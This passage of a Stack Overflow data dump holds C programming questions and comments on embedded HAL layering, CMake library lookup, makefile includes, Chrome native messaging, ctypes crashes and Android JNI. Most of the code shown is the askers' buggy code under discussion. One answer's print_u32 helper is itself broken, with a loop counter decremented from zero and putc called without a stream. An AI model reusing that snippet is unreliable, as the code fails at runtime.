keeping the HAL API lean. For instance, some peripherals may allow you to put a 12-bit result in the top 12 or bottom 12 bits of a 16-bit register. I would not allow for configuring this via the HAL API, but may provide a function to set this directly in the module that implements the HAL API, so in msp430_adc12_driver.h there may be a function <code>msp430_adc12_driver_set_result_alignment()</code> that can be called during system initialisation.</p></li>\n</ol>\n\n<p>I find that this approach allows components to be built on top of the HAL in a hardware-independent way, so I can easily reuse components on different platforms. It also allows the components to be written, debugged and unit test the components off-target, with test doubles for the HAL. </p>\n"}], "owner": {"reputation": 118, "user_id": 5143985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4xd9Q.jpg?s=128&g=1", "display_name": "joosts", "link": "https://stackoverflow.com/users/5143985/joosts"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2454, "favorite_count": 2, "accepted_answer_id": 31619851, "answer_count": 1, "score": -1, "last_activity_date": 1437772326, "creation_date": 1437574864, "last_edit_date": 1437577305, "question_id": 31565858, "link": "https://stackoverflow.com/questions/31565858/how-to-structure-source-code-for-embedded-software", "title": "How to structure source code for embedded software", "body": "<p>In trying to improve my embedded software skills (in procedural C, using C++11 features), I would like to learn what are optimal ways to structure/package source code for embedded systems.</p>\n\n<p>I am working on building small scale systems (on a single microcontollers with 1-k4k RAM memory) without an RTOS. In order to be able to debug my software outside the target environment, I would like to emulate my system on my host computer.</p>\n\n<p>I found out that it is standard to store information about  the processor and its internal devices (RAM, ROM, timers, etc.) in a <a href=\"http://www.windriver.com/products/bsp_web/what_is_a_bsp.pdf\" rel=\"nofollow\">board support package</a>.</p>\n\n<p>But in my embedded project I also use other external devices (push buttons, LEDs, LCD, servos, IO multiplexer, etc.) that are connected using a PCB to the microcontroller. <i><b>What is a standard way/standard name for a source code abstraction layer over an application specific PCB?</b></i></p>\n\n<p>I have searched in books on real-time system engineering (David Simon's <i>An Embedded Software Primer</i>, Jim Cooling's <i>Software Engineering for Real-Time Systems</i> and LaPlante's <i>Real-Time Systems: Design and Analysis</i>), but was unable to find a good reference for code structuring in embedded systems.</p>\n"}, {"tags": ["c++", "c", "windows", "cmake"], "comments": [{"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437585484, "post_id": 31565788, "comment_id": 51094614, "body": "How did you compile your FindSOCI_LIBRARY.cmake or SociXXXX.cmake file or who provided it. It is probably not made correctly as recommended by KitWare"}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1437587614, "post_id": 31565788, "comment_id": 51095874, "body": "@Devolus: Try rerun cmake after removing <code>SOCI_LIBRARY</code> variable from the cache: <code>cmake -U SOCI_LIBRARY &lt;source-dir&gt;</code>. The thing is that result of <code>find_library</code> is cached, and the command does nothing if its first argument&#39;s variable is already set."}, {"owner": {"reputation": 20017, "user_id": 2282011, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/p8sXJ.jpg?s=128&g=1", "display_name": "Devolus", "link": "https://stackoverflow.com/users/2282011/devolus"}, "reply_to_user": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437589618, "post_id": 31565788, "comment_id": 51097086, "body": "@Jens, I made it myself, and I have already used it,but with static projectfiles. Now I&#39;m converting my project to cmake and it is much more pain then I though it would be..."}, {"owner": {"reputation": 20017, "user_id": 2282011, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/p8sXJ.jpg?s=128&g=1", "display_name": "Devolus", "link": "https://stackoverflow.com/users/2282011/devolus"}, "reply_to_user": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1437589872, "post_id": 31565788, "comment_id": 51097236, "body": "@Tsyvarev, thanks! That solved it. :)"}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437591840, "post_id": 31565788, "comment_id": 51098544, "body": "@Devolus I went through the same pain about a year ago. I found this page and its successor quite useful. <a href=\"http://www.cmake.org/Wiki/CMake/Tutorials/How_to_create_a_ProjectConfig.cmake_file\" rel=\"nofollow noreferrer\">cmake.org/Wiki/CMake/Tutorials/&hellip;</a> Once you have solved the worst problems, you never go back."}, {"owner": {"reputation": 20017, "user_id": 2282011, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/p8sXJ.jpg?s=128&g=1", "display_name": "Devolus", "link": "https://stackoverflow.com/users/2282011/devolus"}, "reply_to_user": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437632310, "post_id": 31565788, "comment_id": 51112660, "body": "@Jens, thanks for the link. Setting up a multiplatform buildsystem is always a pain, so seeing cmake I realized that it takes a lot of that away and decided to convert my project. :) And there is always a learning curve when doing something new anyway."}], "owner": {"reputation": 20017, "user_id": 2282011, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/p8sXJ.jpg?s=128&g=1", "display_name": "Devolus", "link": "https://stackoverflow.com/users/2282011/devolus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2126, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1437581773, "creation_date": 1437574708, "last_edit_date": 1437581773, "question_id": 31565788, "link": "https://stackoverflow.com/questions/31565788/cmake-find-library-with-version-number", "title": "cmake find_library with version number", "body": "<p>I have a library in different flavours <code>libsoci-3.2.2_core_s.a</code> <code>libsoci-3.2.2_core_sd.a</code> etc.. One is a static debug version or a static release version and some other versions as well (unicode, DLL, etc.).</p>\n\n<p>Now when I use this cmake statement it finds the first library instead of the correct one.</p>\n\n<pre><code>set(CMAKE_PREFIX_PATH ${SOCI_LIBRARY_PATH})\nfind_library(SOCI_LIBRARY\n    NAMES \"soci-3.2.2_core_${UNICODE_FLAG}s${BUILD_TYPE_FLAG}\"\n    HINTS \"${SOCI_LIBRARY_PATH}\"\n)\nmessage(\"SOCI_SEARCHNAME: soci-3.2.2_core_s${BUILD_TYPE_FLAG}\")\nmessage(\"SOCI_FOUND: ${SOCI_LIBRARY}   soci-3.2.2_core_s${BUILD_TYPE_FLAG}\")\n</code></pre>\n\n<p>Currently I have only static versions of this lib, so I put the 's' hardcoded. The <code>BUILD_TYPE_FLAG</code> is 'd'  for the debug or empty and in this case it is definitely 'd' but cmake always returns</p>\n\n<pre><code>d:\\src\\c\\github\\build\\Datinator&gt;make\nSOCI_SEARCHNAME: soci-3.2.2_core_sd\nSOCI_FOUND: d:/opt/soci/lib/libsoci-3.2.2_core_s.a   soci-3.2.2_core_sd\n-- Configuring done\n-- Generating done\n</code></pre>\n\n<p>So what do I have to do, that cmake finds the correct library version, apart from putting it in separate directories (which I don't like).</p>\n\n<p>Also, is there some way that cmake finds the versionnumber <code>3.2.2</code> itself or do I have to hardcode this?</p>\n"}, {"tags": ["c", "makefile"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1437575025, "post_id": 31565325, "comment_id": 51087289, "body": "Cannot reproduce. As your snippets here are full of small typos, I had to create my own similar example. I guess you have misspelled variable names and similar ..."}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1437575906, "post_id": 31565325, "comment_id": 51088024, "body": "You aren&#39;t seeing the <code>int top.mk</code> message at all in your example output. Are you sure you are dealing with the makefiles you think you are? If you add <code>-d</code> to the make command line does it show you that it is loading the files you think it should be?"}, {"owner": {"reputation": 45, "user_id": 1352956, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5330e6eba96e4a56573caea793fa28e0?s=128&d=identicon&r=PG", "display_name": "fengels", "link": "https://stackoverflow.com/users/1352956/fengels"}, "edited": false, "score": 0, "creation_date": 1437652946, "post_id": 31565325, "comment_id": 51125476, "body": "With the -d I get: &quot;Reading makefile &#39;C:\\Users\\engelsflm\\AppData\\Local\\LocalDoc\\Move\\S12X_Target_&zwnj;&#8203;R2009a\\Implementatio&zwnj;&#8203;\u200c\u200bn\\Src\\top.mk&#39; (search path) (no ~ expansion)...&quot;. Does the &quot;no ~ expansion&quot; mean that the defines are not passed to the top.mk. How do I turn the expansion on?"}], "owner": {"reputation": 45, "user_id": 1352956, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5330e6eba96e4a56573caea793fa28e0?s=128&d=identicon&r=PG", "display_name": "fengels", "link": "https://stackoverflow.com/users/1352956/fengels"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1437628459, "creation_date": 1437573513, "last_edit_date": 1437628459, "question_id": 31565325, "link": "https://stackoverflow.com/questions/31565325/include-makefile-in-a-makefile-and-passing-defines", "title": "include Makefile in a makefile and passing defines", "body": "<p>I am tring to pass a define 'CWROOT' to a make file that is is included in an other makefile.\nLike:\nmain.mk</p>\n\n<pre><code>$(info before top.mk CWROOT=$(CWROOT))\n$(info before top.mk HC12LIB=$(HC12LIB))\ninclude $(SRCDIR)\\top.mk\n$(info after top.mk CWROOT=$(CWROOT))\n$(info after top.mk HC12LIB=$(HC12LIB))\n</code></pre>\n\n<p>where top.mk contains:</p>\n\n<pre><code>$(info int top.mk CWROOT=$(CWROOT))\nTOOLSDIR = $(CWROOT)\\Prog\nHC12LIB  = $(CWROOT)\\lib\n</code></pre>\n\n<p>I run the  make file with the following command:</p>\n\n<pre><code>C:\\gmake\\make.exe -p -f main.mk CWROOT=\"C:\\Programs\\Freescale\\CodeWarS12\" S12X\n</code></pre>\n\n<p>then I get back:</p>\n\n<pre><code>before top.mk CWRoot=C:\\Programs\\Freescale\\CodeWarS12\nbefore top.mk HC12LIB=\nafter top.mk CWRoot=C:\\Programs\\Freescale\\CodeWarS12\nafter top.mk HC12LIB=\\lib\n</code></pre>\n\n<p>Why do I not get back?</p>\n\n<pre><code>after top.mk HC12LIB=C:\\Programs\\Freescale\\CodeWarS12\\lib\n</code></pre>\n\n<p>In other words why is CWROOT not passed to the top.mk?</p>\n\n<p>And  why do I not see the $(info) text from the top.mk?</p>\n\n<p>Thanx,\nFrank</p>\n"}, {"tags": ["c", "google-chrome-extension", "google-chrome-devtools", "chrome-native-messaging"], "comments": [{"owner": {"reputation": 66485, "user_id": 934239, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f6278534f82406052d8aac1da327b84c?s=128&d=identicon&r=PG", "display_name": "Xan", "link": "https://stackoverflow.com/users/934239/xan"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437574514, "post_id": 31565232, "comment_id": 51086868, "body": "@Olaf Please make that into an answer."}], "answers": [{"comments": [{"owner": {"reputation": 66485, "user_id": 934239, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f6278534f82406052d8aac1da327b84c?s=128&d=identicon&r=PG", "display_name": "Xan", "link": "https://stackoverflow.com/users/934239/xan"}, "edited": false, "score": 0, "creation_date": 1437575368, "post_id": 31565959, "comment_id": 51087586, "body": "<i>&quot;Also, are you sure you want to printf the value 0 and not the digit &#39;0&#39;?&quot;</i> Reasonably sure; it&#39;s supposed to be message length in native byte order. See <a href=\"https://developer.chrome.com/extensions/nativeMessaging#native-messaging-host-protocol\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 66485, "user_id": 934239, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f6278534f82406052d8aac1da327b84c?s=128&d=identicon&r=PG", "display_name": "Xan", "link": "https://stackoverflow.com/users/934239/xan"}, "edited": false, "score": 0, "creation_date": 1437575457, "post_id": 31565959, "comment_id": 51087656, "body": "@Xan: I just was not sure, as I do not know the messaging API. So I added this as it is a common mistake of beginners. Thanks for clarifying."}, {"owner": {"reputation": 71, "user_id": 5046765, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5bd69ba37c0adf8c4032431a6b2a21f?s=128&d=identicon&r=PG&f=1", "display_name": "user5046765", "link": "https://stackoverflow.com/users/5046765/user5046765"}, "edited": false, "score": 0, "creation_date": 1437575704, "post_id": 31565959, "comment_id": 51087864, "body": "Thanks for the help. According to the API, I must print the number of bytes in a 32 bits little endian value, followed by my JSON message."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 71, "user_id": 5046765, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5bd69ba37c0adf8c4032431a6b2a21f?s=128&d=identicon&r=PG&f=1", "display_name": "user5046765", "link": "https://stackoverflow.com/users/5046765/user5046765"}, "edited": false, "score": 0, "creation_date": 1437576046, "post_id": 31565959, "comment_id": 51088127, "body": "@user5046765: If that helped, please consider accepting and/or upvoting. That&#39;s how to say thank you on Stack Overflow."}], "tags": [], "owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "is_accepted": false, "score": 1, "last_activity_date": 1437576092, "last_edit_date": 1437576092, "creation_date": 1437575080, "answer_id": 31565959, "question_id": 31565232, "link": "https://stackoverflow.com/questions/31565232/send-data-from-host-app-to-chrome-extension/31565959#31565959", "title": "Send data from Host App to Chrome Extension", "body": "<p><code>%c</code> takes an <code>int</code> argument (<em>intrpreted</em> as <code>unsigned char</code>), not a <code>char</code>. That can/will result in wrong data being printed. Also <code>strlen</code> returns a <code>size_t</code>. You should read the man-pages of the functions you use.</p>\n\n<p><strong>Important:</strong> When passing binary values (not characters), you should either use <code>uint8_t</code> or - at least <code>unsigned char</code>. Remember that <code>char</code> can be signed or unsigned, depending on the implementation. That might lead to surprises on arithmetic operations.</p>\n\n<p>Note:</p>\n\n<pre><code>printf(\"%c%c%c%c\", (char) 10, (char) 0, (char) 0, (char) 0);\nprintf(\"%s\", message);\n</code></pre>\n\n<p>Can be combined (casts removed):</p>\n\n<pre><code>printf(\"%c%c%c%c%s\", 10, 0, 0, 0, message);\n</code></pre>\n\n<p>If there is no library to support, you should think about writing some functions to serialize some basic types like:</p>\n\n<pre><code>static void print_u32(uint32_t value)\n{\n    for ( size_t n = 0 ; n &lt; 4 ; n-- ) {\n        putc((unsigned char)value);  // still passing an int !\n        value &gt;&gt;= 8;\n    }\n}\n\n... print_string( ...\n\nprint_u32(strlen(message));\nprint_string(message);\n</code></pre>\n\n<p>Note that <code>_setmode</code> is not a standard library function. After some googling, it seems to be a BSD extension also supported by Windows (just in case you want that extension to be portable).</p>\n"}], "owner": {"reputation": 71, "user_id": 5046765, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5bd69ba37c0adf8c4032431a6b2a21f?s=128&d=identicon&r=PG&f=1", "display_name": "user5046765", "link": "https://stackoverflow.com/users/5046765/user5046765"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1437576092, "creation_date": 1437573276, "question_id": 31565232, "link": "https://stackoverflow.com/questions/31565232/send-data-from-host-app-to-chrome-extension", "title": "Send data from Host App to Chrome Extension", "body": "<p>After hours of work, I'm able to run a extension and the host app when I activate the extension, but everytime I try to receive data, I get undefined.</p>\n\n<p>This is my code:</p>\n\n<pre><code>int main(int argc, char* argv[]) {\n    char message[] = \"{\\\"t\\\": \\\"t\\\"}\";\n\n    unsigned int len = strlen(message);\n    _setmode(_fileno(stdout), _O_BINARY);\n\n    printf(\"%c%c%c%c\", (char) 10, (char) 0, (char) 0, (char) 0);\n\n    printf(\"%s\", message);\n\n    return 0;\n}\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["python", "c", "ctypes"], "comments": [{"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 2, "creation_date": 1437573546, "post_id": 31565099, "comment_id": 51085995, "body": "Well, for one thing, <code>main</code> in C must be declared as returning <code>int</code>; you can&#39;t have it return a <code>struct Doc</code>, nor can you declare it as just taking whatever arguments you want."}, {"owner": {"reputation": 2027, "user_id": 270654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6db8e6e1cf36dfcc4c4d59e4b5827344?s=128&d=identicon&r=PG", "display_name": "nemetroid", "link": "https://stackoverflow.com/users/270654/nemetroid"}, "edited": false, "score": 0, "creation_date": 1437574669, "post_id": 31565099, "comment_id": 51086994, "body": "In C: <code>wchar_t path[512];</code>, in python: <code>(&quot;path&quot;, ctypes.c_wchar_p)</code>. I haven&#39;t used ctypes but this seems wrong to me. Shouldn&#39;t it be <code>ctypes.c_wchar * 512</code>?"}, {"owner": {"reputation": 1, "user_id": 5140190, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69fa9dda1a4dd12656e6abe055576db5?s=128&d=identicon&r=PG&f=1", "display_name": "\u0420\u043e\u043c\u0430 \u0411\u043e\u0440\u0438\u0441\u043e\u0432", "link": "https://stackoverflow.com/users/5140190/%d0%a0%d0%be%d0%bc%d0%b0-%d0%91%d0%be%d1%80%d0%b8%d1%81%d0%be%d0%b2"}, "edited": false, "score": 0, "creation_date": 1437575525, "post_id": 31565099, "comment_id": 51087704, "body": "Changed ctypes.c_wchar_p to ctypes.c_wchar * 512, Python says Memory Error"}, {"owner": {"reputation": 1, "user_id": 5140190, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69fa9dda1a4dd12656e6abe055576db5?s=128&d=identicon&r=PG&f=1", "display_name": "\u0420\u043e\u043c\u0430 \u0411\u043e\u0440\u0438\u0441\u043e\u0432", "link": "https://stackoverflow.com/users/5140190/%d0%a0%d0%be%d0%bc%d0%b0-%d0%91%d0%be%d1%80%d0%b8%d1%81%d0%be%d0%b2"}, "edited": false, "score": 0, "creation_date": 1437575771, "post_id": 31565099, "comment_id": 51087916, "body": "Tried to decrease 1000000 to 100000 and 512 to 128, Python says OSError: exception: access violation reading 0x009F4000"}, {"owner": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "edited": false, "score": 0, "creation_date": 1437583174, "post_id": 31565099, "comment_id": 51093278, "body": "It should be <code>c_wchar * 512</code>, as noted above. The structures should be passed by reference, i.e. change the function signature to <code>long len, struct Color *c, struct Docs *ds</code>. In Python it&#39;s <code>structure.argtypes =  (c_long, POINTER(Color), POINTER(Docs))</code>. You might want to redesign to move the <code>len</code> parameter into the <code>Docs</code> structure."}, {"owner": {"reputation": 29355, "user_id": 205580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460e6e299e385fd46df156c85a1dd55f?s=128&d=identicon&r=PG", "display_name": "Eryk Sun", "link": "https://stackoverflow.com/users/205580/eryk-sun"}, "edited": false, "score": 0, "creation_date": 1437583422, "post_id": 31565099, "comment_id": 51093423, "body": "From a design perspective, I think the first field of <code>Docs</code> should be a <code>size_t length</code> that provides the number of elements. Then make the <code>doc</code> field a <code>struct Doc *</code> (i.e. <code>POINTER(Doc)</code> in Python). Avoid magic numbers such as 1000000. A 32-bit process probably doesn&#39;t have over a gigabyte of contiguous free address space to store a million <code>Doc</code> records."}, {"owner": {"reputation": 1, "user_id": 5140190, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69fa9dda1a4dd12656e6abe055576db5?s=128&d=identicon&r=PG&f=1", "display_name": "\u0420\u043e\u043c\u0430 \u0411\u043e\u0440\u0438\u0441\u043e\u0432", "link": "https://stackoverflow.com/users/5140190/%d0%a0%d0%be%d0%bc%d0%b0-%d0%91%d0%be%d1%80%d0%b8%d1%81%d0%be%d0%b2"}, "edited": false, "score": 0, "creation_date": 1437589946, "post_id": 31565099, "comment_id": 51097276, "body": "Used Pointers and it finally works!"}], "owner": {"reputation": 1, "user_id": 5140190, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69fa9dda1a4dd12656e6abe055576db5?s=128&d=identicon&r=PG&f=1", "display_name": "\u0420\u043e\u043c\u0430 \u0411\u043e\u0440\u0438\u0441\u043e\u0432", "link": "https://stackoverflow.com/users/5140190/%d0%a0%d0%be%d0%bc%d0%b0-%d0%91%d0%be%d1%80%d0%b8%d1%81%d0%be%d0%b2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2153, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1437574114, "creation_date": 1437572976, "last_edit_date": 1437574114, "question_id": 31565099, "link": "https://stackoverflow.com/questions/31565099/c-python-ctypes-exit-code-1073741819-0xc0000005", "title": "C, Python, ctypes exit code -1073741819 (0xC0000005)", "body": "<p>C code(DLL)</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;wchar.h&gt;\n#include &lt;stdlib.h&gt;\nstruct Doc\n{\n    wchar_t path[512];\n    int r;\n    int g;\n    int b;\n};\n\nstruct Docs\n{\n    struct Doc docs[1000000];\n};\n\nstruct Color\n{\n    int r;\n    int g;\n    int b;\n};\n\nfloat distance(int a, int b, int c, int d, int e, int f)\n{\n    return sqrt((a-b)*(a-b)+(c-d)*(c-d)+(e-f)*(e-f));\n}\n\nstruct Doc main(long len, struct Color c, struct Docs ds)\n{\n    long near = 1000000;\n    long l;\n    struct Doc f_d;\n    for (l = 0; l &lt; len; l++){\n        struct Doc d = ds.docs[l];\n        float dist = distance(c.r, d.r, c.g, d.g, c.b, d.b);\n        if (dist &lt; near){\n            near = dist;\n            f_d = d;\n        }\n    }\n    return f_d;\n};\n</code></pre>\n\n<p>Python code</p>\n\n<pre><code>class Doc(ctypes.Structure):\n    _fields_ = [(\"path\", ctypes.c_wchar_p),\n                (\"r\", ctypes.c_int),\n                (\"g\", ctypes.c_int),\n                (\"b\", ctypes.c_int)]\n\nclass Docs(ctypes.Structure):\n    _fields_ = [(\"docs\", Doc * 1000000)]\n\nclass Color(ctypes.Structure):\n    _fields_ = [(\"r\", ctypes.c_int),\n                (\"g\", ctypes.c_int),\n                (\"b\", ctypes.c_int)]\n\nstructure = ctypes.CDLL('st.dll').main\nstructure.restype = Doc\nstructure.argstypes = (ctypes.c_long, Color(), Docs(),)\n</code></pre>\n\n<p>After calling main function from python it drops with exit code <code>-1073741819</code>\nAfter <code>exe</code> execution returns <code>\"Process finished with exit code -1073741819 (0xC0000005)\"</code><br>\nI think it is because of memory allocation or something like that.</p>\n"}, {"tags": ["android", "c", "java-native-interface", "native"], "comments": [{"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1437573246, "post_id": 31565059, "comment_id": 51085744, "body": "Why would you give your function a name like <code>Java_com_example_calljavaservice_MainActivity_getJniString</code> unless it&#39;s going to be called from Java? (and if it&#39;s called from Java, it will receive a <code>JNIEnv*</code>)"}, {"owner": {"reputation": 11, "user_id": 4776078, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ianOaOm4M9w/AAAAAAAAAAI/AAAAAAAAAZE/GhZSE0cbh5M/photo.jpg?sz=128", "display_name": "Shahrooz Pooryousef", "link": "https://stackoverflow.com/users/4776078/shahrooz-pooryousef"}, "reply_to_user": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1437794881, "post_id": 31565059, "comment_id": 51193785, "body": "yes, if its called from java, it will receive a JNIEnv*, but i dont want call that from java, i need execute this file(an executable file) from command line of from another c method in another file."}], "owner": {"reputation": 11, "user_id": 4776078, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ianOaOm4M9w/AAAAAAAAAAI/AAAAAAAAAZE/GhZSE0cbh5M/photo.jpg?sz=128", "display_name": "Shahrooz Pooryousef", "link": "https://stackoverflow.com/users/4776078/shahrooz-pooryousef"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 625, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1437818868, "creation_date": 1437572892, "last_edit_date": 1437818868, "question_id": 31565059, "link": "https://stackoverflow.com/questions/31565059/android-native-ndk-jnienv-env", "title": "android native ndk jnienv* env", "body": "<p>I am new in android Native App development. For some reseons I need to run an .so file at the sdcard from an ELF file(executable file). I need to define JNIEnv* env variable in ELF file and pass that to .so file with dlopen command, OR define JNIEnv* env in .so file, I want to send an sms in my Native Android Application.\nMy native method is like below:</p>\n\n<pre><code>void Java_com_example_calljavaservice_MainActivity_getJniString() {\n    //I should define env variable here\n    jclass smsManagerClz = (*env)-&gt;FindClass(env,\n                    \"android/telephony/SmsManager\");\n\n    jmethodID getDefaultMethodID = (*env)-&gt;GetStaticMethodID(env, smsManagerClz,\"getDefault\", \"()Landroid/telephony/SmsManager;\");\n    jobject smsManagerObj = (*env)-&gt;CallStaticObjectMethod(env, smsManagerClz, getDefaultMethodID);\n    jmethodID sendSMSMethodID = (*env)-&gt;GetMethodID(env, smsManagerClz, \"sendTextMessage\",\"(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;\"\"Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V\");\n\n    jstring number = (*env)-&gt;NewStringUTF(env, \"5554\");\n\n    jstring text = (*env)-&gt;NewStringUTF(env, \"sms content\");\n\n\n     jstring nullString = (*env)-&gt;NewStringUTF(env, \"\");\n\n     (*env)-&gt;CallVoidMethod(env, smsManagerObj, sendSMSMethodID, number, nullString, text, NULL, NULL);\n}\n</code></pre>\n\n<p>I don't have JNIEnv* env in my method parameters, and I want to define env variable in my method, but I don't know how define that.I don't want to send env variable to my method.\nsuppose I want to call my .so file from an ELF file in the sdcard, thanks in advance.</p>\n"}, {"tags": ["c", "fibonacci", "modulus"], "answers": [{"comments": [{"owner": {"reputation": 528, "user_id": 3147102, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/d5ba477b3828f1c18b0a32429e6e967f?s=128&d=identicon&r=PG", "display_name": "Slugger", "link": "https://stackoverflow.com/users/3147102/slugger"}, "edited": false, "score": 0, "creation_date": 1437573303, "post_id": 31564740, "comment_id": 51085788, "body": "Thanks for the answer, this indeed works. I was considering perhaps defining my own recursive function for multiplying two numbers which finds a*b by adding b to itself a times, each time performing the modulo operation. This will be horridly slow probably but should alleviate the problems with overflow. Anyway, thanks for the  helpful answer!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437580312, "post_id": 31564740, "comment_id": 51091405, "body": "Unclear as why <code>uint64_t</code> is 